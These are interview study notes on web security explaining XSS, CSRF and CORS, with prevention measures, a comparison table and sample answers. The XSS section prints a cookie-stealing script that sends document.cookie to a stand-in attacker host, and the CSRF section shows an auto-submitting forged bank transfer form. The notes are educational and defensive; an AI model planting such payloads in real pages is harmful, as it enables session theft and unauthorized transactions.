# Web Security Interview Notes (XSS, CSRF & CORS)

---

# 1. XSS (Cross-Site Scripting)

## What is XSS?

XSS is an attack where an attacker injects malicious JavaScript into a trusted web page. When another user opens that page, the script executes in the user's browser and may steal sensitive information or perform unauthorized actions.

### Example

A website allows users to post comments.

The attacker submits:

```html
<script>
fetch("https://attacker.com?cookie=" + document.cookie);
</script>
```

When another user views the comment, the JavaScript executes and attempts to steal the session cookie.

### How to Prevent XSS

* Validate and sanitize user input.
* Encode output before rendering HTML.
* Use Content Security Policy (CSP).
* Store cookies as **HttpOnly** (prevents JavaScript from reading cookies).

> **Note:** HttpOnly does **not** prevent XSS. It only reduces the impact by protecting session cookies.

---

# 2. CSRF (Cross-Site Request Forgery)

## What is CSRF?

CSRF is an attack where a malicious website tricks a logged-in user's browser into sending an unwanted request to another trusted application. Since browsers automatically send session cookies, the server may treat the request as legitimate.

### Example

The user is already logged into:

```
https://bank.com
```

The attacker creates another website containing:

```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to" value="attacker">
</form>

<script>
document.forms[0].submit();
</script>
```

The browser automatically sends the session cookie, so the bank may process the request unless CSRF protection is enabled.

### How to Prevent CSRF

* Use **CSRF Tokens**.
* Configure cookies with **SameSite=Lax** or **SameSite=Strict**.
* Validate the **Origin** or **Referer** header.
* Use **JWT** in the `Authorization` header for stateless REST APIs.

### Why JWT protects against CSRF?

Browsers automatically send **session cookies**, but they do **not** automatically send the **Authorization** header. The frontend application explicitly adds the JWT token to each request, so a malicious website cannot force the browser to include it.

---

# 3. CORS (Cross-Origin Resource Sharing)

## What is CORS?

CORS is a browser security mechanism that controls whether JavaScript running on one origin can access resources from another origin. A cross-origin request occurs when the protocol, domain, or port is different.

### Example

Frontend:

```
http://localhost:3000
```

Backend:

```
http://localhost:8080
```

The frontend calls:

```javascript
fetch("http://localhost:8080/api/users")
```

Since the origins are different, the browser checks whether the backend allows requests from `http://localhost:3000`.

If the backend returns:

```http
Access-Control-Allow-Origin: http://localhost:3000
```

the browser allows the response.

Otherwise, it blocks JavaScript from accessing the response and shows a CORS error.

### How to Configure CORS

* `@CrossOrigin` (Controller level)
* Global `WebMvcConfigurer`
* Spring Security (`http.cors()`)
* API Gateway / Nginx (Most common in production)

### Production Best Practice

In production, CORS is usually configured centrally at the **API Gateway**, **Reverse Proxy (Nginx)**, or **Spring Security**, rather than using `@CrossOrigin` on every controller. Only trusted frontend domains are allowed instead of using `*`.

---

# XSS vs CSRF vs CORS

| XSS                                                           | CSRF                                                                          | CORS                                                         |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------- | ------------------------------------------------------------ |
| Malicious JavaScript executes in the user's browser.          | A malicious website tricks a logged-in user's browser into sending a request. | A browser security policy that controls cross-origin access. |
| Security Vulnerability                                        | Security Vulnerability                                                        | Browser Security Mechanism                                   |
| Goal: Execute malicious JavaScript or steal data.             | Goal: Perform unauthorized actions as the victim.                             | Goal: Protect users from unauthorized cross-origin access.   |
| Prevent using Validation, Sanitization, Output Encoding, CSP. | Prevent using CSRF Token, SameSite, JWT, Origin validation.                   | Configure allowed origins on the backend.                    |

---

# HttpOnly vs SameSite

## HttpOnly

* Prevents JavaScript from reading cookies.
* Browser still sends the cookie automatically.
* Protects session cookies from being stolen during an XSS attack.

## SameSite

* Controls when browsers send cookies in cross-site requests.
* Helps prevent CSRF attacks.

### SameSite=Lax

* Allows cookies for same-site requests.
* Allows cookies when the user intentionally navigates using a top-level GET request (clicking a normal link).
* Blocks cookies for cross-site POST requests.

### SameSite=Strict

* Sends cookies only for same-site requests.
* Never sends cookies for requests originating from another website.

---

# Easy Memory Tricks

### XSS

```
Bad JavaScript
↓

Prevent:
✔ Validation
✔ Sanitization
✔ Output Encoding
✔ CSP

Protect Cookie:
✔ HttpOnly
```

---

### CSRF

```
Bad Website
↓

Browser automatically sends Session Cookie

Prevent:
✔ CSRF Token
✔ SameSite
✔ JWT
✔ Origin Validation
```

---

### CORS

```
Different Origin

↓

Browser asks:

"Does the backend allow this origin?"

↓

Backend returns:

Access-Control-Allow-Origin

↓

Browser decides whether JavaScript can access the response.
```

---

# Interview Answers (30–45 Seconds)

## XSS

> XSS is an attack where an attacker injects malicious JavaScript into a trusted webpage. When another user opens the page, the script executes in their browser and may steal sensitive information or perform unauthorized actions. We prevent XSS using input validation, input sanitization, output encoding, and Content Security Policy. We also use HttpOnly cookies to prevent JavaScript from reading session cookies.

---

## CSRF

> CSRF is an attack where a malicious website tricks a logged-in user's browser into sending an unwanted request to another trusted application. Since browsers automatically send session cookies, the server may process the request as legitimate. We prevent CSRF using CSRF tokens, SameSite cookies, Origin validation, or by using JWT-based authentication for stateless REST APIs.

---

## CORS

> CORS is a browser security mechanism that controls whether JavaScript running on one origin can access resources from another origin. When a cross-origin request is made, the browser checks whether the backend allows that origin by looking at headers like `Access-Control-Allow-Origin`. In production, CORS is usually configured at the API Gateway, Reverse Proxy, or Spring Security layer.
